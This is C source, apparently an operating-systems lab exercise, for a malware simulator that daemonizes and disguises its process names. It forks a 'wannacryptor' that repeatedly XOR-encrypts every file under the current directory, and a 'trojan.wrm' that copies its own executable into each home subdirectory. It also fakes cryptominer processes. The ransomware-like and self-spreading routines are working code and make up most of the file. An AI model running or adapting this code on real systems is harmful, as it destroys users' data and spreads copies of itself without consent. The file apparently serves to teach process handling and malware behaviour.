#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <limits.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <time.h>

#define MAX_PATH 4096
#define KEYLOG_PATH "/tmp/sandbox/soal_3/keylog.txt"
#define MINER_LOG "/tmp/.miner.log"

char root_path[MAX_PATH];

void xor_file(const char *filepath, unsigned char key) {
    FILE *fp = fopen(filepath, "rb+");
    if (!fp) return;
    int ch;
    while ((ch = fgetc(fp)) != EOF) {
        fseek(fp, -1, SEEK_CUR);
        fputc(ch ^ key, fp);
    }
    fclose(fp);
}

void wannacryptor(const char *base_path, unsigned char key) {
    //buat testing
    FILE *log = fopen("/tmp/log_wannacryptor.txt", "a");
    if (log) {
        fprintf(log, "[%ld] wannacryptor start: %s\n", time(NULL), base_path);
        fclose(log);
    }

    DIR *dir = opendir(base_path);
    if (!dir) return;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;
        if (!strcmp(entry->d_name, "runme")) continue;

        char path[MAX_PATH];
        snprintf(path, sizeof(path), "%s/%s", base_path, entry->d_name);

        struct stat st;
        if (stat(path, &st) == -1) continue;

        if (strncmp(path, root_path, strlen(root_path)) != 0)
            continue;

        if (S_ISDIR(st.st_mode)) {
            wannacryptor(path, key);
        } else if (S_ISREG(st.st_mode)) {
            xor_file(path, key);
        }
    }

    closedir(dir);
}

void spread_malware(const char *self_path) {
    // buat testing
    FILE *log = fopen("/tmp/log_trojan.txt", "a");
    if (log) {
        fprintf(log, "[%ld] trojan spreading to /home/user...\n", time(NULL));
        fclose(log);
    }

    DIR *dir = opendir("/home/user");
    if (!dir) return;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;

        char path[MAX_PATH];
        snprintf(path, sizeof(path), "/home/user/%s", entry->d_name);

        struct stat st;
        if (stat(path, &st) == -1 || !S_ISDIR(st.st_mode)) continue;

        char dest[MAX_PATH];
        snprintf(dest, sizeof(dest), "%s/runme", path);

        FILE *src = fopen(self_path, "rb");
        FILE *dst = fopen(dest, "wb");
        if (src && dst) {
            char buf[1024];
            size_t n;
            while ((n = fread(buf, 1, sizeof(buf), src)) > 0)
                fwrite(buf, 1, n, dst);
            fclose(src);
            fclose(dst);
            chmod(dest, 0755);
        }
    }

    closedir(dir);
}

void generate_hash(char *out) {
    const char *hex = "0123456789abcdef";
    for (int i = 0; i < 64; i++)
        out[i] = hex[rand() % 16];
    out[64] = '\0';
}

void get_timestamp(char *out, size_t size) {
    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    strftime(out, size, "[%Y-%m-%d %H:%M:%S]", tm);
}

void spawn_miners() {
    // buat testing
    FILE *log = fopen("/tmp/log_rodok.txt", "a");
    if (log) {
        fprintf(log, "[%ld] spawning 4 mine-crafter...\n", time(NULL));
        fclose(log);
    }

    for (int i = 0; i < 4; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            char name[32];
            snprintf(name, sizeof(name), "mine-crafter-%d", i);
            prctl(PR_SET_NAME, name, 0, 0, 0);
            srand(time(NULL) ^ getpid());

            while (1) {
                int delay = (rand() % 28) + 3;
                sleep(delay);

                char hash[65], timestamp[64];
                generate_hash(hash);
                get_timestamp(timestamp, sizeof(timestamp));

                FILE *f = fopen(MINER_LOG, "a");
                if (f) {
                    fprintf(f, "%s[Miner %02d] %s\n", timestamp, i, hash);
                    fclose(f);
                }
            }
            exit(0);
        }
    }
}

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    setsid();
    chdir("/");
    umask(0);
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
}

int main() {
    // ambil path direktorinya
    if (!getcwd(root_path, sizeof(root_path))) {
        perror("getcwd");
        exit(1);
    }

    char self_path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (len != -1) self_path[len] = '\0';

    daemonize();
    prctl(PR_SET_NAME, "/init", 0, 0, 0);

    // === wannacryptor ===
    if (fork() == 0) {
        prctl(PR_SET_NAME, "wannacryptor", 0, 0, 0);
        while (1) {
            unsigned char key = (unsigned char)(time(NULL) % 256);
            FILE *k = fopen(KEYLOG_PATH, "w");
            if (k) {
                fprintf(k, "%d\n", key);
                fclose(k);
            }
            wannacryptor(root_path, key);
            sleep(30);
        }
        exit(0);
    }

    // === trojan.wrm ===
    if (fork() == 0) {
        prctl(PR_SET_NAME, "trojan.wrm", 0, 0, 0);
        while (1) {
            spread_malware(self_path);
            sleep(30);
        }
        exit(0);
    }

    // === rodok.exe & miners ===
    if (fork() == 0) {
        prctl(PR_SET_NAME, "rodok.exe", 0, 0, 0);
        spawn_miners();
        while (1) pause();
        exit(0);
    }

    while (1) pause();
    return 0;
}